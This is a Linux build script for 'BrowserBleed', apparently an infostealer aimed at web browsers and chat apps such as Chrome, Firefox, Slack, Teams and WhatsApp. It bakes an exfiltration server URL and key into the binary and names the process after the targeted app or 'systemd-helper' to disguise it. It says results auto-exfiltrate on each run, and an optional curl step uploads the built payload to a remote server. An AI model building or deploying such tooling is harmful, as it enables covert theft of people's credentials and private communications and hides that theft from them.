#!/usr/bin/env bash
# Build BrowserBleed_linux as a standalone binary with the report server baked in.
# Dependencies (Python 3.10+, cryptography, pyinstaller, binutils) are installed automatically.
#   chmod +x build_linux.sh && ./build_linux.sh
#
# The resulting binary auto-exfils results to the configured report server on each run.
#
# Available presets:
#   Browsers:  chrome, edge, brave, firefox, opera
#   Chat:      slack, discord, teams, zoom, whatsapp, telegram
#
# Examples:
#   ./build_linux.sh --preset chrome
#   ./build_linux.sh --preset slack
#   ./build_linux.sh --preset teams --exfil-url https://reports.example.com --exfil-key mykey
#   ./build_linux.sh --name systemd-helper --exfil-url https://... --exfil-key ...
#
# To point at a different server without deploy/config:
#   EXFIL_URL=https://reports.example.com EXFIL_KEY=mykey ./build_linux.sh --preset chrome

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILD_TMP="$(mktemp -d)"
trap 'rm -rf "$BUILD_TMP"' EXIT

# ── Dependency installer ──────────────────────────────────────────────────────
PYTHON=""  # set by install_deps, used for all subsequent python invocations

_pkg_install() {
    # Install a system package using whatever package manager is present.
    # Works whether running as root directly or as a normal user with sudo.
    local pkg="$1"
    local SUDO=""
    if [[ "$(id -u)" != "0" ]]; then
        if ! command -v sudo &>/dev/null; then
            echo "[!] Root privileges required to install '$pkg'."
            echo "    Re-run as root (sudo ./build_linux.sh) or install sudo."
            exit 1
        fi
        SUDO="sudo"
    fi

    if command -v apt-get &>/dev/null; then
        $SUDO apt-get install -y "$pkg"
    elif command -v dnf &>/dev/null; then
        $SUDO dnf install -y "$pkg"
    elif command -v yum &>/dev/null; then
        $SUDO yum install -y "$pkg"
    elif command -v pacman &>/dev/null; then
        $SUDO pacman -Sy --noconfirm "$pkg"
    elif command -v zypper &>/dev/null; then
        $SUDO zypper install -y "$pkg"
    else
        return 1
    fi
}

_find_or_install_python() {
    # Check candidates in preference order - return the first 3.10+ one found
    for candidate in python3.13 python3.12 python3.11 python3.10 python3; do
        if command -v "$candidate" &>/dev/null; then
            local ver
            ver=$("$candidate" -c 'import sys; print(sys.version_info.major * 10 + sys.version_info.minor)' 2>/dev/null) || continue
            if (( ver >= 310 )); then
                PYTHON="$candidate"
                echo "[+] Found $($candidate --version)"
                return 0
            fi
        fi
    done

    # Nothing suitable found - try to install one
    echo "[!] Python 3.10+ not found - attempting to install..."

    if command -v apt-get &>/dev/null; then
        # Try direct package first (works on Ubuntu 22.04+, Debian 12+)
        for pyver in python3.12 python3.11 python3.10; do
            if sudo apt-get install -y "$pyver" 2>/dev/null; then
                PYTHON="$pyver"
                echo "[+] Installed $("$pyver" --version)"
                return 0
            fi
        done
        # Fall back to deadsnakes PPA (Ubuntu only)
        if command -v add-apt-repository &>/dev/null || sudo apt-get install -y software-properties-common; then
            echo "[*] Trying deadsnakes PPA..."
            sudo add-apt-repository -y ppa:deadsnakes/ppa && sudo apt-get update -q
            for pyver in python3.12 python3.11 python3.10; do
                if sudo apt-get install -y "$pyver" 2>/dev/null; then
                    PYTHON="$pyver"
                    echo "[+] Installed $("$pyver" --version) via deadsnakes"
                    return 0
                fi
            done
        fi
    elif command -v dnf &>/dev/null; then
        for pyver in python3.12 python3.11 python3.10; do
            if sudo dnf install -y "$pyver" 2>/dev/null; then
                PYTHON="$pyver"
                echo "[+] Installed $("$pyver" --version)"
                return 0
            fi
        done
    elif command -v yum &>/dev/null; then
        # RHEL/CentOS - try SCL or IUS repo packages
        for pyver in python312 python311 python310; do
            if sudo yum install -y "$pyver" 2>/dev/null; then
                bin="${pyver/python/python}"
                command -v "python${pyver: -2:1}.${pyver: -2}" &>/dev/null && PYTHON="python${pyver: -2:1}.${pyver: -2}" || PYTHON="$bin"
                echo "[+] Installed Python via yum"
                return 0
            fi
        done
    elif command -v pacman &>/dev/null; then
        # Arch always ships latest Python as 'python'
        sudo pacman -Sy --noconfirm python && PYTHON="python" && return 0
    elif command -v zypper &>/dev/null; then
        for pyver in python312 python311 python310; do
            if sudo zypper install -y "$pyver" 2>/dev/null; then
                PYTHON="${pyver/python/python}" && return 0
            fi
        done
    fi

    # Last resort: pyenv
    echo "[!] Could not install Python 3.10+ via system package manager."
    echo "    To install manually:"
    echo "      pyenv:  curl https://pyenv.run | bash && pyenv install 3.12 && pyenv global 3.12"
    echo "      Ubuntu: sudo add-apt-repository ppa:deadsnakes/ppa && sudo apt install python3.12"
    echo "      Fedora: sudo dnf install python3.12"
    exit 1
}

install_deps() {
    echo "[*] Checking dependencies..."

    _find_or_install_python

    # On Debian/Ubuntu, python3.X-venv is a *separate* package that bundles pip/ensurepip
    # into the venv.  Without it, 'python3.X -m venv' creates a pip-less venv and
    # ensurepip is also unavailable, so there is no way to bootstrap pip afterwards.
    # Install it now (before creating the venv) so everything is in place.
    local pybin; pybin=$(basename "$PYTHON")
    if command -v apt-get &>/dev/null; then
        echo "[*] Ensuring ${pybin}-venv is installed (required for pip in venvs)..."
        _pkg_install "${pybin}-venv" 2>/dev/null || _pkg_install python3-venv || true
    fi

    # venv module sanity-check (non-apt distros may still be missing it)
    if ! "$PYTHON" -m venv --help &>/dev/null; then
        echo "[!] python3-venv not found - installing..."
        _pkg_install "${pybin}-venv" 2>/dev/null || _pkg_install python3-venv || {
            echo "[!] Could not install venv module. Try: sudo apt install python3-venv"
            exit 1
        }
    fi

    # Create a persistent venv so packages survive between runs
    # This also avoids the PEP 668 "externally-managed-environment" error on
    # Ubuntu 23.04+/Debian 12+ which blocks pip from writing to the system Python.
    VENV_DIR="$SCRIPT_DIR/.bb_build_env"

    # Detect a broken venv and wipe it so we recreate cleanly.
    # Broken cases: no activate script, Python not runnable, or pip completely absent
    # (the last case happens on Ubuntu when python3.X-venv wasn't installed first).
    if [[ -d "$VENV_DIR" ]]; then
        local _venv_ok=1
        [[ ! -f "$VENV_DIR/bin/activate" ]] && _venv_ok=0
        "$VENV_DIR/bin/python" -c "" &>/dev/null || _venv_ok=0
        "$VENV_DIR/bin/python" -m pip --version &>/dev/null || _venv_ok=0
        if [[ "$_venv_ok" -eq 0 ]]; then
            echo "[!] Existing venv at $VENV_DIR is broken - removing and recreating..."
            rm -rf "$VENV_DIR" || { echo "[!] Cannot remove broken venv (try: sudo rm -rf $VENV_DIR)"; exit 1; }
        fi
    fi

    if [[ ! -d "$VENV_DIR" ]]; then
        echo "[*] Creating build venv at $VENV_DIR..."
        "$PYTHON" -m venv "$VENV_DIR"
    fi

    # Prefer 'python', fall back to 'python3' — Ubuntu venvs sometimes omit the bare symlink
    if [[ -x "$VENV_DIR/bin/python" ]]; then
        PYTHON="$VENV_DIR/bin/python"
    elif [[ -x "$VENV_DIR/bin/python3" ]]; then
        PYTHON="$VENV_DIR/bin/python3"
    else
        echo "[!] No Python binary found in venv at $VENV_DIR/bin/"
        echo "    Contents: $(ls "$VENV_DIR/bin/" 2>/dev/null || echo '<empty>')"
        exit 1
    fi

    # binutils (strip)
    if ! command -v strip &>/dev/null; then
        echo "[!] strip not found - installing binutils..."
        _pkg_install binutils || echo "[!] Could not install binutils - binary won't be stripped (non-fatal)"
    fi

    # Python packages — use 'python -m pip' (more portable than the pip symlink)
    echo "[*] Installing Python packages (cryptography, pyinstaller)..."
    if ! "$PYTHON" -m pip --version &>/dev/null; then
        echo "[*] pip not found in venv - bootstrapping via ensurepip..."
        "$PYTHON" -m ensurepip --upgrade || {
            echo "[!] ensurepip failed - trying to install python3-pip..."
            _pkg_install python3-pip || {
                echo "[!] Could not bootstrap pip. Install it manually and retry."
                exit 1
            }
        }
    fi
    "$PYTHON" -m pip install --quiet --upgrade cryptography pyinstaller
    echo "[+] Python packages ready"
    echo ""
}

install_deps

# ── Preset definitions ────────────────────────────────────────────────────────
declare -A PRESET_NAMES=(
    [chrome]="google-chrome"
    [edge]="microsoft-edge"
    [brave]="brave-browser"
    [firefox]="firefox"
    [opera]="opera"
    [slack]="slack"
    [discord]="discord"
    [teams]="teams"
    [zoom]="zoom"
    [whatsapp]="whatsapp-desktop"
    [telegram]="telegram-desktop"
)

# Human-readable descriptions (for build output only)
declare -A PRESET_DESCS=(
    [chrome]="Google Chrome"
    [edge]="Microsoft Edge"
    [brave]="Brave Browser"
    [firefox]="Mozilla Firefox"
    [opera]="Opera"
    [slack]="Slack"
    [discord]="Discord"
    [teams]="Microsoft Teams"
    [zoom]="Zoom"
    [whatsapp]="WhatsApp"
    [telegram]="Telegram"
)

# ── Argument parsing ──────────────────────────────────────────────────────────
PRESET=""
BINARY_NAME=""
EXFIL_URL="${EXFIL_URL:-}"
EXFIL_KEY="${EXFIL_KEY:-}"
UPLOAD=0

print_usage() {
    echo "Usage: ./build_linux.sh [OPTIONS]"
    echo ""
    echo "  --preset NAME       Use a named preset (see list below)"
    echo "  --name BINARY       Custom binary name (process name in ps/top)"
    echo "  --exfil-url URL     Override exfil server URL"
    echo "  --exfil-key KEY     Override exfil API key"
    echo "  --upload            Upload built binary to the payload server after building"
    echo ""
    echo "Presets:"
    echo "  BROWSERS"
    for k in chrome edge brave firefox opera; do
        printf "    %-12s %s\n" "$k" "${PRESET_DESCS[$k]}"
    done
    echo "  CHAT APPS"
    for k in slack discord teams zoom whatsapp telegram; do
        printf "    %-12s %s\n" "$k" "${PRESET_DESCS[$k]}"
    done
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --preset)     PRESET="$2";      shift 2 ;;
        --name)       BINARY_NAME="$2"; shift 2 ;;
        --exfil-url)  EXFIL_URL="$2";   shift 2 ;;
        --exfil-key)  EXFIL_KEY="$2";   shift 2 ;;
        --upload)     UPLOAD=1;         shift ;;
        --help|-h)    print_usage; exit 0 ;;
        *) echo "[!] Unknown argument: $1"; print_usage; exit 1 ;;
    esac
done

# ── Apply preset ──────────────────────────────────────────────────────────────
if [[ -n "$PRESET" ]]; then
    PRESET_LC="${PRESET,,}"
    if [[ -z "${PRESET_NAMES[$PRESET_LC]+_}" ]]; then
        echo "[!] Unknown preset '$PRESET'"
        echo "    Available: ${!PRESET_NAMES[*]}"
        exit 1
    fi
    [[ -z "$BINARY_NAME" ]] && BINARY_NAME="${PRESET_NAMES[$PRESET_LC]}"
fi

# ── Interactive menu (shown when no --preset or --name given) ─────────────────
if [[ -z "$BINARY_NAME" ]]; then
    echo ""
    echo "Select a preset:"
    echo ""
    echo "  BROWSERS"
    echo "  [1]  chrome     - google-chrome"
    echo "  [2]  edge       - microsoft-edge"
    echo "  [3]  brave      - brave-browser"
    echo "  [4]  firefox    - firefox"
    echo "  [5]  opera      - opera"
    echo ""
    echo "  CHAT APPS"
    echo "  [6]  slack      - slack"
    echo "  [7]  discord    - discord"
    echo "  [8]  teams      - teams"
    echo "  [9]  zoom       - zoom"
    echo "  [10] whatsapp   - whatsapp-desktop"
    echo "  [11] telegram   - telegram-desktop"
    echo ""
    read -rp "Enter number: " CHOICE
    MENU=("" "chrome" "edge" "brave" "firefox" "opera" "slack" "discord" "teams" "zoom" "whatsapp" "telegram")
    if [[ "$CHOICE" =~ ^[0-9]+$ ]] && (( CHOICE >= 1 && CHOICE <= 11 )); then
        PRESET_LC="${MENU[$CHOICE]}"
        BINARY_NAME="${PRESET_NAMES[$PRESET_LC]}"
        echo "[*] Selected: $PRESET_LC → $BINARY_NAME"
    else
        echo "[!] Invalid selection. Run again with --preset NAME or --name BINARY."
        exit 1
    fi
fi

# ── Load deploy/config if exfil values not set ───────────────────────────────
CONFIG="$SCRIPT_DIR/deploy/config"
if [[ -f "$CONFIG" ]]; then
    DOMAIN_VAL=$(grep '^DOMAIN=' "$CONFIG" | cut -d= -f2- || true)
    KEY_VAL=$(grep '^BB_API_KEY=' "$CONFIG" | cut -d= -f2- || true)
    [[ -z "$EXFIL_URL" && -n "$DOMAIN_VAL" ]] && EXFIL_URL="https://$DOMAIN_VAL"
    [[ -z "$EXFIL_KEY" && -n "$KEY_VAL"    ]] && EXFIL_KEY="$KEY_VAL"
fi

if [[ -z "$EXFIL_URL" || -z "$EXFIL_KEY" ]]; then
    echo "[!] EXFIL_URL or EXFIL_KEY not set"
    echo "    Add DOMAIN and BB_API_KEY to deploy/config, or pass --exfil-url / --exfil-key"
    echo "    or set EXFIL_URL=... EXFIL_KEY=... in the environment"
    exit 1
fi

echo "[*] Building: $BINARY_NAME"
echo "    Exfil URL:  $EXFIL_URL"
echo "    Exfil key:  ${EXFIL_KEY:0:4}****"
echo "    Process name in ps/top: $BINARY_NAME"

# ── Patch a temp copy of the source ──────────────────────────────────────────
TMP_SRC="$BUILD_TMP/BrowserBleed_linux.py"
sed \
    -e "s|_EXFIL_URL: str = \"\"|_EXFIL_URL: str = \"$EXFIL_URL\"|" \
    -e "s|_EXFIL_KEY: str = \"\"|_EXFIL_KEY: str = \"$EXFIL_KEY\"|" \
    "$SCRIPT_DIR/BrowserBleed_linux.py" > "$TMP_SRC"

# Verify substitution worked
if ! grep -q "$EXFIL_URL" "$TMP_SRC" || ! grep -q "$EXFIL_KEY" "$TMP_SRC"; then
    echo "[!] Substitution failed - URL/key not found in patched source. Aborting."
    exit 1
fi

# ── Build ─────────────────────────────────────────────────────────────────────
echo "[*] Building with PyInstaller..."
"$PYTHON" -m PyInstaller \
    --onefile \
    --name "$BINARY_NAME" \
    --distpath "$SCRIPT_DIR" \
    --workpath "$BUILD_TMP" \
    --specpath "$BUILD_TMP" \
    "$TMP_SRC"

# Strip debug symbols to reduce size and remove Python build artifacts from strings
if command -v strip &>/dev/null; then
    strip --strip-all "$SCRIPT_DIR/$BINARY_NAME" 2>/dev/null || true
fi

echo ""
echo "[+] Done: $SCRIPT_DIR/$BINARY_NAME"
echo "    Drop and run: sudo ./$BINARY_NAME"
echo "    Results auto-exfil to $EXFIL_URL"

# ── Upload to payload server ──────────────────────────────────────────────────
if [[ "$UPLOAD" == "1" ]]; then
    echo ""
    echo "[*] Uploading $BINARY_NAME to $EXFIL_URL/payloads ..."
    HTTP_STATUS=$(curl -s -o /tmp/bb_upload_resp.txt -w "%{http_code}" \
        -X POST "$EXFIL_URL/payloads" \
        -H "Authorization: Bearer $EXFIL_KEY" \
        -F "file=@$SCRIPT_DIR/$BINARY_NAME;filename=$BINARY_NAME")
    if [[ "$HTTP_STATUS" =~ ^[23] ]]; then
        echo "[+] Uploaded: $EXFIL_URL/payloads/$BINARY_NAME"
    else
        echo "[!] Upload failed (HTTP $HTTP_STATUS)"
        cat /tmp/bb_upload_resp.txt 2>/dev/null && echo ""
    fi
    rm -f /tmp/bb_upload_resp.txt
fi
